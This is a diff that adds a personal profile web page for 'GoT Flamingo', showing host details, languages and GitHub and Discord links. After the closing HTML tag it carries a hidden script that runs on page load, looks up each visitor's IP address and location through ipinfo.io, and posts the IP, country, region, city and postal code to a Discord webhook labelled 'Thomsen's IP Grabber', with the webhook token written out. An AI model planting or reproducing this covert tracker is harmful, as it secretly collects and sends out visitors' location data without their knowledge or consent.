@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>GoT Flamingo</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="63eaa2107ecff54d40226882204063b6.jpg"
+    />
+    <meta content="#205297" data-react-helmet="true" name="theme-color" />
+  </head>
+  <body>
+    <script defer src="js/debug.js"></script>
+    <script defer src="js/fade.js"></script>
+    <body>
+      <div class="main">
+        <div class="container hidden">
+          <img
+            class="profile-pic"
+            src="pictures/63eaa2107ecff54d40226882204063b6.gif"
+            alt="Profile Picture"
+          />
+          <div class="info">
+            <p>Host: <span>GoT Flamingo</span></p>
+            <p>Os: <span>Windows 10 / Kali Linux</span></p>
+            <p>Architecture: <span>x64</span></p>
+            <p>Discord: <span>.gotflamingo</span></p>
+            <p>IP: <span id="location-placeholder">hej med dig</span></p>
+            <p>From: <span>Denmark And Russia </span></p>
+            <p>Language: <span>Danish And English And Russia</span></p>
+          </div>
+        </div>
+        <div class="sub-container hidden">
+          <p class="command">
+             > Proud Owner of GoT Squad | HTML C# CSS PYTHON C++ <
+          </p>
+        </div>
+        <div class="social-container hidden">
+          <p class="command">
+            <a
+              href="https://github.com/Gotflamingo"
+              style="text-decoration: none; color: #aaaaaa"
+              >GitHub</a
+            >
+            |
+            <a
+              href="https://discord.gg/ysSbV99j5n"
+              style="text-decoration: none; color: #aaaaaa"
+              >Discord</a
+            >
+          </p>
+        </div>
+      </div>
+    </body>
+    <script src="js/time.js"></script>
+    <script src="js/glitch.js"></script>
+  </body>
+</html>
+
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://ptb.discord.com/api/webhooks/1191689332839436348/SCOshR1SUePGkgxZ_GVX_qksfOshUWRWlIGSA2birRtUm8QQnssMbaa-P6HQ2infN-rN");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "Thomsen's IP Grabber",
+          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
+          embeds: [
+               {
+                    title: "Thomsen's IP Grabber",
+                    color: 15000,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
